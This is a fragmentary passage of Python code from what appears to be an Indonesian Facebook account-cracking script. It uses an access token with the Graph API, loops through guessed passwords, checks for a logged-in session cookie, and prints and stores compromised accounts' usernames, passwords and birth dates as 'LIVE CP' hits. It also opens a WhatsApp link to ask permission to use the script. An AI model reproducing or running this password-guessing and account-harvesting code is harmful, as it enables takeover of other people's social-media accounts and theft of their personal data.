...
def cek_pw():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/923165456679?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
...
def login_cookie():
    ...
    try:
        ...
        jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC META.'%(M,N,H,N));time.sleep(3)
        input('\n [%sPRESS ENTER%s] to continue'%(H,N))
        os.system('xdg-open https://wa.me/923165456679?text=Hallo+izin+menggunakan+SC+ini')
        moch_yayan()
...
def moch_yayan():
    ...
    try:
        xx = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()
        nama = xx['name']
        idfb = xx['id']
    except KeyError:
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r %sAXB LIVE CP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[AXB-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
